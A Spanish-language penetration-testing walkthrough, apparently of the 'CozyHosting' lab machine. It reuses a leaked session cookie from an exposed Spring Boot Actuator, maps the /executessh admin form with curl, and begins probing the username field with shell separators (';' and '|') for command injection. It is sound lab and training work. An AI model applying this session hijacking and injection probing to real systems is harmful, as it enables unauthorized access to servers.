La rama secundaria sigue siendo:

SSH pendiente de credenciales

El siguiente paso único es:

guardar correctamente el HTML completo de /admin y extraer formularios/campos/endpoints.

## Comandos

Crear el directorio local de evidencias si no existe:

mkdir -p loot

Guardar el HTML completo del panel autenticado:

curl -sS http://cozyhosting.htb/admin \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -o loot/admin_kanderson.html

Comprobar que el fichero se ha guardado:

ls -lh loot/admin_kanderson.html

Ver el título y referencias principales:

grep -Ei 'title|Dashboard|K\. Anderson|Admin|host|patch|ssh|execute|addhost|executessh' loot/admin_kanderson.html

Extraer formularios y campos:

grep -Ei 'form|method|action|input|button|textarea|select|name=|hostname|username|host' loot/admin_kanderson.html

Extraer acciones de formularios:

grep -oP '<form[^>]*>' loot/admin_kanderson.html

Extraer nombres de campos input:

grep -oP '<input[^>]*>' loot/admin_kanderson.html

Extraer enlaces y recursos:

grep -oP 'href="\K[^"]+|src="\K[^"]+' loot/admin_kanderson.html | sort -u

Buscar referencias directas a endpoints relevantes:

grep -Ei '/executessh|executessh|/addhost|addhost|ssh|hostname|username' loot/admin_kanderson.html

Ver la parte final del HTML, donde suelen aparecer formularios inferiores:

tail -n 120 loot/admin_kanderson.html

## Comprobaciones

Debe comprobarse que loot/admin_kanderson.html existe y contiene el HTML completo del panel.

Debe comprobarse si el panel contiene un formulario relacionado con hosts, parcheo, SSH o compliance.

Debe comprobarse cuál es el action real del formulario.

Debe comprobarse si el método es POST.

Debe comprobarse qué campos viajan en el formulario.

Debe comprobarse si aparecen nombres como hostname y username.

Debe comprobarse si el endpoint /executessh aparece en el HTML o si se invoca indirectamente.

Debe comprobarse si /addhost es una vista rota por acceso directo o si no participa en el flujo principal.

## Notas para el informe

La reutilización de la sesión de kanderson confirma acceso autenticado real al dashboard.

El panel muestra una identidad interna y funciones relacionadas con gestión de hosts, lo que justifica plenamente la rama WEB-AUTH / PANEL.

La exposición de Actuator no solo reveló rutas internas, sino que permitió obtener una sesión válida.

El error de curl al combinar con head no forma parte del comportamiento vulnerable; es un detalle local de terminal.

El fallo de grep tampoco afecta al objetivo. La evidencia debe guardarse correctamente antes de extraer formularios.

Cadena actual:

Spring Boot Actuator expuesto
→ /actuator/sessions revela sesión de kanderson
→ cookie JSESSIONID reutilizada
→ acceso a /admin confirmado
→ dashboard autenticado como K. Anderson
→ inspección pendiente del formulario del panel

Hallazgo dominante:

acceso autenticado al panel mediante sesión filtrada

Rama principal activa:

WEB-AUTH / PANEL

Siguiente paso único:

guardar el HTML completo de /admin e identificar el formulario o endpoint que gestiona hosts.

## Ejecutamos:

.rw-r--r-- r4mon r4mon 13 KB Sat May  2 13:49:39 2026  loot/admin_kanderson.html
    <title>Dashboard - Cozy Cloud</title>
    <link href="assets/css/admin.css" rel="stylesheet">
    * Template Name: NiceAdmin
    * Template URL: https://bootstrapmade.com/nice-admin-bootstrap-admin-html-template/
                            <h4>Keep your hosts patched!</h4>
                            <p>3 hosts require your attention.</p>
            <span class="d-none d-md-block ps-2">K. Anderson</span>
    <div class="pagetitle">
        <h1>Admin Dashboard</h1>
    <section class="section dashboard">
                                <h5 class="card-title">Recent Sales <span>| Today</span></h5>
                                        <th scope="col">Host</th>
                                        <td><span class="badge bg-success">Patched</span></td>
                                        <td><span class="badge bg-success">Patched</span></td>
                                        <td><span class="badge bg-danger">Not patched</span></td>
                                        <td><a href="#" class="text-primary">Administrator panel</a></td>
                                        <td><span class="badge bg-success">Patched</span></td>
                                        <td><span class="badge bg-danger">Not patched</span></td>
                                        <td><span class="badge bg-success">Patched</span></td>
                                        <td><span class="badge bg-success">Patched</span></td>
                                        <td><span class="badge bg-danger">Not patched</span></td>
                        <h5 class="card-title">Running software <span>| Today</span></h5>
                        <h5 class="card-title">Include host into automatic patching</h5>
                                included in your host's .ssh/authorised_keys file.</p>
                        <form action="/executessh" method="post">
                                        <input name="host" class="form-control" id="host" placeholder="example.com">
                                        <label for="host">Hostname</label>
<script src="assets/js/admin.js"></script>
    <meta content="width=device-width, initial-scale=1.0" name="viewport">
                            <h4>Keep your hosts patched!</h4>
                            <p>3 hosts require your attention.</p>
                                        <th scope="col">Host</th>
                  echarts.init(document.querySelector("#trafficChart")).setOption({
                        <h5 class="card-title">Include host into automatic patching</h5>
                                included in your host's .ssh/authorised_keys file.</p>
                        <form action="/executessh" method="post">
                                <label class="col-sm-2 col-form-label">Connection settings</label>
                                    <div class="form-floating mb-3">
                                        <input name="host" class="form-control" id="host" placeholder="example.com">
                                        <label for="host">Hostname</label>
                                    <div class="form-floating mb-3">
                                        <input name="username" class="form-control" id="username" placeholder="user">
                                        <label for="username">Username</label>
                                <button type="submit" class="btn btn-primary">Submit</button>
                                <button type="reset" class="btn btn-secondary">Reset</button>
                        </form>
<form action="/executessh" method="post">
<input name="host" class="form-control" id="host" placeholder="example.com">
<input name="username" class="form-control" id="username" placeholder="user">
#
assets/css/admin.css
assets/img/favicon.png
assets/img/logo.png
assets/img/profile-img.jpg
assets/js/admin.js
assets/vendor/bootstrap/css/bootstrap.min.css
assets/vendor/bootstrap-icons/bootstrap-icons.css
assets/vendor/bootstrap/js/bootstrap.bundle.min.js
assets/vendor/echarts/echarts.min.js
https://bootstrapmade.com/
https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Nunito:300,300i,400,400i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i
https://fonts.gstatic.com
index
                                included in your host's .ssh/authorised_keys file.</p>
                        <form action="/executessh" method="post">
                                        <label for="host">Hostname</label>
                                        <input name="username" class="form-control" id="username" placeholder="user">
                                        <label for="username">Username</label>

                        <script>
                document.addEventListener("DOMContentLoaded", () => {
                  echarts.init(document.querySelector("#trafficChart")).setOption({
                    tooltip: {
                      trigger: 'item'
                    },
                    legend: {
                      top: '5%',
                      left: 'center'
                    },
                    series: [{
                      name: 'Access From',
                      type: 'pie',
                      radius: ['40%', '70%'],
                      avoidLabelOverlap: false,
                      label: {
                        show: false,
                        position: 'center'
                      },
                      emphasis: {
                        label: {
                          show: true,
                          fontSize: '18',
                          fontWeight: 'bold'
                        }
                      },
                      labelLine: {
                        show: false
                      },
                      data: [{
                          value: 1048,
                          name: 'Pending scan'
                        },
                        {
                          value: 735,
                          name: 'Up to date'
                        },
                        {
                          value: 520,
                          name: 'Pending update'
                        },
                        {
                          value: 520,
                          name: 'Security update is required'
                        }
                      ]
                    }]
                  });
                });

                        </script>

                    </div>
                </div>

            </div>

        </div>
        <div class="row">
            <div class="col-lg-12">
                <div class="card">
                    <div class="card-body">
                        <h5 class="card-title">Include host into automatic patching</h5>
                        <div class="alert alert-info  alert-dismissible fade show" role="alert">
                            <h4 class="alert-heading">Please note</h4>
                            <p>For Cozy Scanner to connect the private key that you received upon registration should be
                                included in your host's .ssh/authorised_keys file.</p>
                        </div>


                        <form action="/executessh" method="post">

                            <div class="row mb-3">
                                <label class="col-sm-2 col-form-label">Connection settings</label>
                                <div class="col-sm-10">
                                    <div class="form-floating mb-3">
                                        <input name="host" class="form-control" id="host" placeholder="example.com">
                                        <label for="host">Hostname</label>
                                    </div>
                                    <div class="form-floating mb-3">
                                        <input name="username" class="form-control" id="username" placeholder="user">
                                        <label for="username">Username</label>
                                    </div>
                                </div>
                            </div>
                            <div class="text-center">
                                <button type="submit" class="btn btn-primary">Submit</button>
                                <button type="reset" class="btn btn-secondary">Reset</button>
                            </div>
                        </form>

                    </div>
                </div>

            </div>
        </div>
    </section>

</main>

<footer class="footer">
    <div class="copyright">
        &copy; Copyright <strong><span>Cozy Cloud</span></strong>. All Rights Reserved
    </div>
    <div class="credits">
        Designed by <a href="https://bootstrapmade.com/">BootstrapMade</a>
    </div>
</footer>

<a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i
        class="bi bi-arrow-up-short"></i></a>

<script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
<script src="assets/vendor/echarts/echarts.min.js"></script>
<script src="assets/js/admin.js"></script>

</body>

</html>%

## Objetivo

Analizar el HTML completo del panel autenticado de CozyHosting y fijar el siguiente paso técnico dentro de WEB-AUTH / PANEL, sin saltar todavía a explotación.

## Hechos verificados

El fichero del panel autenticado se ha guardado correctamente:

loot/admin_kanderson.html

El tamaño del fichero es de aproximadamente 13 KB, por lo que ya se dispone del HTML completo para análisis local.

El panel confirma de nuevo el contexto autenticado:

Dashboard - Cozy Cloud

El usuario visible en el panel es:

K. Anderson

El panel contiene una sección funcional llamada:

Include host into automatic patching

La propia interfaz explica que Cozy Scanner intenta conectarse al host del usuario mediante una clave privada recibida durante el registro:

For Cozy Scanner to connect the private key that you received upon registration should be included in your host's .ssh/authorised_keys file.

El panel contiene un formulario real:

<form action="/executessh" method="post">

El formulario envía datos por POST al endpoint:

/executessh

Los campos controlados por el usuario son:

host
username

El campo host aparece así:

<input name="host" class="form-control" id="host" placeholder="example.com">

El campo username aparece así:

<input name="username" class="form-control" id="username" placeholder="user">

La ruta /executessh ya había sido observada previamente en /actuator/mappings como una función backend asociada a:

ComplianceService#executeOverSsh

## Supuestos

La funcionalidad del panel parece diseñada para que la aplicación intente conectarse por SSH al host indicado por el usuario.

El backend probablemente usa los valores host y username para construir una operación de conexión remota.

La combinación entre el nombre del endpoint, el texto del panel y el handler observado en mappings convierte /executessh en el punto técnico más importante de la fase actual.

El formulario no debe tratarse todavía como explotable. Primero hay que validar su comportamiento normal con valores benignos.

El valor host probablemente tendrá validación más estricta, porque representa el destino de conexión.

El valor username también es un punto de entrada relevante, porque participa en la construcción de la conexión SSH.

## Método

La lectura correcta de esta fase es:

sesión de kanderson reutilizada
→ acceso real al panel
→ formulario de parcheo automático identificado
→ endpoint POST /executessh confirmado
→ campos host y username controlables
→ backend relacionado con SSH
→ siguiente paso único: probar el flujo normal con valores benignos y observar la respuesta

No conviene modificar todavía la entrada de forma agresiva.

No conviene probar payloads sin haber documentado antes cómo responde el flujo legítimo.

No conviene centrarse en /addhost, porque el formulario real observado en el panel apunta a /executessh.

## Respuesta

El hallazgo dominante ahora es el formulario autenticado que llama a /executessh.

Este formulario conecta directamente el panel con una funcionalidad backend de SSH. Por tanto, la investigación deja de ser una simple revisión de panel y pasa a centrarse en un flujo real de aplicación:

usuario autenticado
→ formulario de inclusión de host
→ POST /executessh
→ backend ComplianceService
→ operación SSH desde el servidor

La rama principal sigue siendo:

WEB-AUTH / PANEL

La rama secundaria sigue siendo:

SSH pendiente de credenciales

El siguiente paso único debe ser enviar una petición normal al formulario con valores benignos, guardar la respuesta y observar qué error devuelve la aplicación.

## Comandos

Crear carpeta para respuestas si no existe:

mkdir -p loot

Probar el flujo normal con valores benignos:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test' \
  -o loot/executessh_test_127001.txt

Ver la respuesta recibida:

cat loot/executessh_test_127001.txt

Probar con un hostname de formato normal:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=example.com' \
  --data-urlencode 'username=test' \
  -o loot/executessh_test_example.txt

Ver la segunda respuesta:

cat loot/executessh_test_example.txt

Comparar ambas respuestas:

diff -u loot/executessh_test_127001.txt loot/executessh_test_example.txt

## Comprobaciones

Debe comprobarse qué código HTTP devuelve /executessh.

Debe comprobarse si la aplicación redirige, devuelve error JSON o devuelve HTML.

Debe comprobarse si el mensaje de error diferencia entre host inválido, usuario inválido, fallo de SSH o validación de entrada.

Debe comprobarse si el valor host acepta IPs locales como 127.0.0.1.

Debe comprobarse si el valor host acepta dominios normales como example.com.

Debe comprobarse si el valor username aparece reflejado en la respuesta.

Debe comprobarse si la respuesta sugiere que el backend ha intentado realmente una conexión SSH.

Debe comprobarse si hay diferencias entre errores de validación y errores de ejecución.

## Notas para el informe

La inspección completa del panel confirma que la sesión filtrada no solo permite ver un dashboard, sino acceder a una funcionalidad real de administración.

La funcionalidad crítica se llama “Include host into automatic patching” y usa el endpoint POST /executessh.

El texto del panel indica que Cozy Scanner usa una clave privada para conectarse al host indicado por el cliente. Esto sugiere que el servidor intenta iniciar una conexión SSH usando datos introducidos por el usuario.

Los campos relevantes para el análisis son host y username.

La secuencia metodológica correcta es validar primero el comportamiento normal del formulario antes de analizar posibles abusos de entrada.

Cadena actual:

Actuator expuesto
→ sesión de kanderson filtrada
→ acceso autenticado a /admin
→ formulario de parcheo automático
→ endpoint /executessh
→ parámetros host y username controlables
→ validación pendiente del comportamiento normal

Hallazgo dominante:

formulario autenticado que conecta con backend SSH

Siguiente paso único:

enviar una petición normal a /executessh con valores benignos y analizar la respuesta.

## Ejecutamos:

───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_test_127001.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 11:51:41 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=Host key verification failed.
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_test_example.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 11:52:01 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname example.com: Temporary failure in name resolution
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
--- loot/executessh_test_127001.txt	2026-05-02 13:51:41.440767392 +0200
+++ loot/executessh_test_example.txt	2026-05-02 13:52:01.600768252 +0200
@@ -1,8 +1,8 @@
 HTTP/1.1 302
 Server: nginx/1.18.0 (Ubuntu)
-Date: Sat, 02 May 2026 11:51:41 GMT
+Date: Sat, 02 May 2026 11:52:01 GMT
 Content-Length: 0
-Location: http://cozyhosting.htb/admin?error=Host key verification failed.
+Location: http://cozyhosting.htb/admin?error=ssh: Could not resolve hostname example.com: Temporary failure in name resolution
 Connection: keep-alive
 X-Content-Type-Options: nosniff
 X-XSS-Protection: 0

## Objetivo

Analizar la respuesta del endpoint /executessh con valores benignos y determinar qué demuestra sobre el comportamiento real del backend de CozyHosting.

## Hechos verificados

El endpoint /executessh responde con redirección HTTP 302 cuando recibe una petición POST autenticada.

La prueba con host 127.0.0.1 y username test devuelve:

HTTP/1.1 302

La cabecera Location contiene este error:

Host key verification failed.

La prueba con host example.com y username test también devuelve:

HTTP/1.1 302

La cabecera Location contiene este error:

ssh: Could not resolve hostname example.com: Temporary failure in name resolution

Ambas respuestas redirigen al panel /admin incluyendo el error como parámetro en la URL.

El backend no devuelve un error genérico propio de formulario. Devuelve mensajes compatibles con una ejecución real del cliente SSH.

La diferencia entre ambas respuestas demuestra que el valor del campo host llega a una operación SSH real:

127.0.0.1 produce error de verificación de clave de host.

example.com produce error de resolución DNS.

## Supuestos

El backend está construyendo una llamada SSH con los parámetros recibidos desde el formulario.

El campo host influye directamente en el destino de la conexión SSH.

El campo username probablemente participa también en la construcción del comando o de la conexión SSH, aunque todavía no se ha validado cómo lo procesa exactamente.

La aplicación refleja el error de SSH en la redirección hacia /admin, lo que convierte esa respuesta en una fuente útil para analizar validaciones y comportamiento.

El endpoint /executessh ya no es solo una ruta interesante. Es una funcionalidad real de backend confirmada.

## Método

La lectura correcta de esta fase es:

formulario autenticado
→ POST /executessh
→ host=127.0.0.1
→ error real de SSH
→ host=example.com
→ error real de resolución
→ backend ejecuta una operación SSH
→ siguiente paso: estudiar validación de campos antes de cualquier hipótesis de inyección

Todavía no debe asumirse explotación.

La evidencia actual confirma ejecución de flujo SSH, no ejecución arbitraria de comandos.

El siguiente análisis debe centrarse en responder tres preguntas:

1. ¿Qué validaciones aplica el campo host?
2. ¿Qué validaciones aplica el campo username?
3. ¿El backend trata username como dato seguro o como parte de una cadena de ejecución?

## Respuesta

El hallazgo dominante es que /executessh ejecuta realmente una operación SSH desde el servidor.

Esto se demuestra porque distintos valores de host producen errores distintos y coherentes con el cliente SSH:

- 127.0.0.1 resuelve y llega a fase de verificación de clave.
- example.com no resuelve desde el servidor y falla por DNS.

La rama principal sigue siendo WEB-AUTH / PANEL, pero el foco ya no está en “mirar el panel”, sino en analizar la funcionalidad backend asociada al formulario.

El siguiente paso único debe ser una validación controlada de entrada sobre los campos host y username, empezando por comprobaciones no destructivas y observando únicamente diferencias de error.

## Comandos

Guardar una respuesta con host localhost para comparar con 127.0.0.1:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=localhost' \
  --data-urlencode 'username=test' \
  -o loot/executessh_test_localhost.txt

Ver la respuesta:

cat loot/executessh_test_localhost.txt

Probar si el campo host aplica validación estricta con un valor claramente inválido:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=invalid host' \
  --data-urlencode 'username=test' \
  -o loot/executessh_test_host_invalido.txt

Ver la respuesta:

cat loot/executessh_test_host_invalido.txt

Probar si el campo username permite espacios o caracteres no habituales:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test user' \
  -o loot/executessh_test_username_espacio.txt

Ver la respuesta:

cat loot/executessh_test_username_espacio.txt

Probar si el campo username aparece reflejado en errores usando un valor marcador:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=marcadorcozy' \
  -o loot/executessh_test_username_marcador.txt

Ver la respuesta:

cat loot/executessh_test_username_marcador.txt

Comparar todas las respuestas:

diff -u loot/executessh_test_127001.txt loot/executessh_test_localhost.txt

diff -u loot/executessh_test_127001.txt loot/executessh_test_host_invalido.txt

diff -u loot/executessh_test_127001.txt loot/executessh_test_username_espacio.txt

diff -u loot/executessh_test_127001.txt loot/executessh_test_username_marcador.txt

## Comprobaciones

Debe comprobarse si localhost produce el mismo tipo de error que 127.0.0.1.

Debe comprobarse si el campo host rechaza espacios o caracteres inválidos antes de llegar a SSH.

Debe comprobarse si el campo username acepta espacios.

Debe comprobarse si el valor de username aparece reflejado en el error de SSH.

Debe comprobarse si los errores cambian antes o después de la fase de ejecución SSH.

Debe comprobarse si la validación fuerte está en host, en username o en ambos.

## Notas para el informe

La funcionalidad /executessh ha quedado validada como flujo real de backend.

La aplicación no simula el parcheo: intenta ejecutar una conexión SSH desde el servidor hacia el host indicado.

La diferencia de errores entre 127.0.0.1 y example.com es una evidencia fuerte de que el parámetro host llega al cliente SSH.

El error se refleja en una redirección hacia /admin, lo que permite usar la cabecera Location como canal de observación.

La siguiente fase no debe formularse como explotación directa, sino como análisis de validación de entrada en una función backend que construye una operación SSH.

Cadena actual:

sesión filtrada
→ acceso al panel
→ formulario /executessh
→ operación SSH real confirmada
→ errores SSH reflejados
→ validación de campos pendiente

Hallazgo dominante:

/executessh ejecuta una operación SSH real desde el backend

Rama principal activa:

WEB-AUTH / PANEL

Siguiente paso único:

validar cómo procesa la aplicación los campos host y username antes de plantear hipótesis de abuso.

## Ejecutamos:

───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_test_localhost.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 11:53:56 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=Host key verification failed.
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_test_host_invalido.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 11:53:56 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=Invalid hostname!
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_test_username_espacio.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 11:53:56 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=Username can't contain whitespaces!
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/executessh_test_username_marcador.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ HTTP/1.1 302
   2   │ Server: nginx/1.18.0 (Ubuntu)
   3   │ Date: Sat, 02 May 2026 11:53:56 GMT
   4   │ Content-Length: 0
   5   │ Location: http://cozyhosting.htb/admin?error=Host key verification failed.
   6   │ Connection: keep-alive
   7   │ X-Content-Type-Options: nosniff
   8   │ X-XSS-Protection: 0
   9   │ Cache-Control: no-cache, no-store, max-age=0, must-revalidate
  10   │ Pragma: no-cache
  11   │ Expires: 0
  12   │ X-Frame-Options: DENY
  13   │
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
--- loot/executessh_test_127001.txt	2026-05-02 13:51:41.440767392 +0200
+++ loot/executessh_test_localhost.txt	2026-05-02 13:53:54.823719776 +0200
@@ -1,6 +1,6 @@
 HTTP/1.1 302
 Server: nginx/1.18.0 (Ubuntu)
-Date: Sat, 02 May 2026 11:51:41 GMT
+Date: Sat, 02 May 2026 11:53:56 GMT
 Content-Length: 0
 Location: http://cozyhosting.htb/admin?error=Host key verification failed.
 Connection: keep-alive
--- loot/executessh_test_127001.txt	2026-05-02 13:51:41.440767392 +0200
+++ loot/executessh_test_host_invalido.txt	2026-05-02 13:53:54.937053115 +0200
@@ -1,8 +1,8 @@
 HTTP/1.1 302
 Server: nginx/1.18.0 (Ubuntu)
-Date: Sat, 02 May 2026 11:51:41 GMT
+Date: Sat, 02 May 2026 11:53:56 GMT
 Content-Length: 0
-Location: http://cozyhosting.htb/admin?error=Host key verification failed.
+Location: http://cozyhosting.htb/admin?error=Invalid hostname!
 Connection: keep-alive
 X-Content-Type-Options: nosniff
 X-XSS-Protection: 0
--- loot/executessh_test_127001.txt	2026-05-02 13:51:41.440767392 +0200
+++ loot/executessh_test_username_espacio.txt	2026-05-02 13:53:55.070386454 +0200
@@ -1,8 +1,8 @@
 HTTP/1.1 302
 Server: nginx/1.18.0 (Ubuntu)
-Date: Sat, 02 May 2026 11:51:41 GMT
+Date: Sat, 02 May 2026 11:53:56 GMT
 Content-Length: 0
-Location: http://cozyhosting.htb/admin?error=Host key verification failed.
+Location: http://cozyhosting.htb/admin?error=Username can't contain whitespaces!
 Connection: keep-alive
 X-Content-Type-Options: nosniff
 X-XSS-Protection: 0
--- loot/executessh_test_127001.txt	2026-05-02 13:51:41.440767392 +0200
+++ loot/executessh_test_username_marcador.txt	2026-05-02 13:53:55.227053127 +0200
@@ -1,6 +1,6 @@
 HTTP/1.1 302
 Server: nginx/1.18.0 (Ubuntu)
-Date: Sat, 02 May 2026 11:51:41 GMT
+Date: Sat, 02 May 2026 11:53:56 GMT
 Content-Length: 0
 Location: http://cozyhosting.htb/admin?error=Host key verification failed.
 Connection: keep-alive

## Objetivo

Analizar las pruebas de validación de entrada sobre /executessh y determinar qué campo concentra ahora el mayor interés técnico.

## Hechos verificados

La prueba con host localhost devuelve el mismo comportamiento que 127.0.0.1:

Location: http://cozyhosting.htb/admin?error=Host key verification failed.

Esto confirma que localhost resuelve correctamente desde el servidor y que el backend llega a intentar una conexión SSH.

La prueba con un host inválido que contiene espacio devuelve:

Location: http://cozyhosting.htb/admin?error=Invalid hostname!

Esto confirma que el campo host tiene una validación específica de formato.

La prueba con username que contiene espacio devuelve:

Location: http://cozyhosting.htb/admin?error=Username can't contain whitespaces!

Esto confirma que el campo username también tiene validación, pero al menos la validación observada se centra en espacios en blanco.

La prueba con username marcadorcozy devuelve:

Location: http://cozyhosting.htb/admin?error=Host key verification failed.

Esto indica que un username sin espacios pasa la validación y el flujo continúa hasta la operación SSH.

Las respuestas siguen usando HTTP 302 hacia /admin con el error incluido en la cabecera Location.

## Supuestos

El campo host parece más restringido que el campo username.

El campo username no acepta espacios, pero todavía no queda demostrado que bloquee otros caracteres especiales.

El backend probablemente construye una operación SSH usando username y host.

La validación de username puede estar intentando impedir entradas problemáticas, pero solo se ha comprobado de forma directa el caso de espacios.

El hallazgo más prometedor ya no está en descubrir rutas nuevas, sino en entender cómo se construye la llamada SSH con los campos controlables.

## Método

La lectura correcta de esta fase es:

/executessh confirmado
→ host validado con formato estricto
→ username rechaza espacios
→ username sin espacios continúa hasta SSH
→ los errores de SSH se reflejan en Location
→ siguiente paso único: validar si username admite caracteres de control sin espacios

El campo host ya ha mostrado una validación clara.

El campo username, en cambio, solo ha mostrado rechazo explícito a espacios. Esto deja una pregunta técnica abierta:

¿la aplicación bloquea únicamente espacios o también bloquea caracteres que puedan alterar la construcción del comando SSH?

Esa pregunta debe responderse con una verificación corta y benigna, no con una cadena de explotación.

## Respuesta

El hallazgo dominante es que el backend ejecuta una operación SSH real y aplica validaciones distintas sobre host y username.

El campo host queda parcialmente controlado por una validación de hostname.

El campo username queda como punto de interés principal porque acepta valores sin espacios y participa en el flujo que llega hasta SSH.

La rama principal sigue siendo:

WEB-AUTH / PANEL

La rama secundaria sigue siendo:

SSH pendiente de credenciales

El siguiente paso único debe ser comprobar si el campo username acepta caracteres especiales sin espacios y si esos caracteres alteran el comportamiento de la respuesta.

## Comandos

Probar un carácter especial simple en username, sin espacios:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test;' \
  -o loot/executessh_test_username_puntoycoma.txt

cat loot/executessh_test_username_puntoycoma.txt

Probar otro separador sin espacios:

curl -sS -i -X POST http://cozyhosting.htb/executessh \
  -H 'Cookie: JSESSIONID=69EF63EAAED85BD239B2A03AFE4B7D29' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'host=127.0.0.1' \
  --data-urlencode 'username=test|' \
